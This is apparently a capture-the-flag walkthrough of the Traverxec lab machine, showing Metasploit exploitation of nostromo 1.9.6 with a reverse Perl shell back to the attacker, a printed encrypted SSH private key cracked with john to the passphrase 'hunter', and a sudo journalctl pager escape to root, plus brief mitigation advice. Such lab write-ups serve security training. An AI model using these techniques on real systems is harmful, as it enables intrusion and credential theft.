## Machine Name: Traverxec  
## Machine IP: 10.129.15.250  

To begin with, I made a port scan.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ nmap -Pn 10.129.15.250 -sV
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 14:07 +0400
Nmap scan report for traverxec.htb (10.129.15.250)
Host is up (0.16s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
```
As you can see the http service is "nostromo 1.9.6". I searched for any exploit for that version and yeah, it is vulnerable to RCE.    

```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ msfconsole -q             
msf > search nostromo 1.9.6

Matching Modules
================

   #  Name                                     Disclosure Date  Rank  Check  Description
   -  ----                                     ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec    2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
   1    \_ target: Automatic (Unix In-Memory)  .                .     .      .
   2    \_ target: Automatic (Linux Dropper)   .                .     .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/nostromo_code_exec
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, socks4, http, socks5
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf exploit(multi/http/nostromo_code_exec) > setg RHOSTS 10.129.15.250
RHOSTS => 10.129.15.250
msf exploit(multi/http/nostromo_code_exec) > setg LHOST tun0
LHOST => tun0
msf exploit(multi/http/nostromo_code_exec) > run
[*] Started reverse TCP handler on 10.10.14.54:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.54:4444 -> 10.129.15.250:38194) at 2026-04-05 14:09:41 +0400
whoami

www-data
```

I got a shell as www-data user. I saw that there is only one system user named "david". My goal is to get his credentials right now. I looked through several files for a while and finally, found very important information at that file:      
```bash
/var/nostromo/conf/nhttpd.conf
```
Its content is:   
```bash
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

I discovered the path to David’s public directory by analyzing the nhttpd.conf configuration file. In the HOMEDIRS section, I noticed that the server was configured to use /home as the base directory for users.     
The homedirs_public directive specifically pointed to a folder named public_www, which meant the web server looked for files inside /home/username/public_www.       
Since I already knew the username was david, I combined these pieces of information to identify the full path as /home/david/public_www. Even though I did not have direct permission to list the contents of David's main home directory, I was able to bypass this restriction by navigating directly to the specific public_www subfolder. This allowed me to find the sensitive backup files that were stored there.    

```bash
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls -la
ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$
```
As you can see there is a zipped tar file. Lets copy it into /tmp where we have write permission and open this file.    

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cp backup-ssh-identity-files.tgz /tmp
<ed-file-area$ cp backup-ssh-identity-files.tgz /tmp           
www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp
cd /tmp
www-data@traverxec:/tmp$ tar -xzvf backup-ssh-identity-files.tgz
tar -xzvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
www-data@traverxec:/tmp$ cat home/david/.ssh/id_rsa
cat home/david/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
www-data@traverxec:/tmp$
```

It is an ecrypted ssh key. Lets decrypt it on another terminal:    

```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ nano key   
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ ssh2john key > davidkey                         
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt davidkey
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ john --show davidkey                                     
key:hunter

1 password hash cracked, 0 left
```
Yeahh, we got the passphase. Lets became david user and get the user flag now.    

----
# User Flag  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ chmod 600 key     
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ ssh -i key david@10.129.15.250
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'key': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sun Apr  5 04:47:16 2026 from 10.10.14.54
david@traverxec:~$ cat user.txt
```

----
# Privilege Escalation  
There is an unusual "bin" folder in david's home directory. Lets look at what is inside it.    
```bash
david@traverxec:~$ ls -la
total 36
drwx--x--x 5 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Oct 25  2019 bin
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
drwx------ 2 david david 4096 Oct 25  2019 .ssh
-r--r----- 1 root  david   33 Apr  5 04:02 user.txt
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~/bin$
```
"In this scenario, we have a script where the journalctl command is executed with sudo privileges. journalctl is a utility used for querying and displaying logs from systemd. The vulnerability we are exploiting here is known as a 'Pager Escape'.  

What is a Pager?  
A Pager is a terminal utility (such as less or more) used by commands like journalctl, man, or git log to handle large outputs. Its primary job is to display data one page at a time, based on the terminal's window size. For example, if you run less /etc/services, you can navigate the file using PgUp and PgDn. This interface is separate from your standard terminal scrollback, and you can exit it by pressing 'q'.  

In most Linux systems, the $PAGER environmental variable is set to less by default. The critical security flaw is that less allows the execution of system commands from within its interface. For instance, typing !id while inside less will display your current user ID.  

The Exploit:  
If a user can run a pager-related command with sudo, they can spawn a root shell by simply typing !/bin/bash. In this specific machine, the output is too short to trigger the pager automatically. However, we can force the pager to activate by reducing the terminal window size. Once the (END) prompt appears, we enter !/bin/bash to escalate our privileges to root.  

Mitigation:  
To prevent this, system administrators should either:  

    Use the --no-pager flag in the sudo configuration: /usr/bin/sudo /usr/bin/journalctl --no-pager.

    Restrict sudo permissions to specific, non-interactive commands in the /etc/sudoers file."

Let's do it. Just small the window size and wait to see (END) in there.    

<img width="1074" height="583" alt="image" src="https://github.com/user-attachments/assets/5bad4556-066d-4b3c-ae5a-654dec7edf29" />    

And we are root:  

<img width="1074" height="583" alt="image" src="https://github.com/user-attachments/assets/5fa97f56-f367-4779-a06f-ed932a12d4e9" />  






















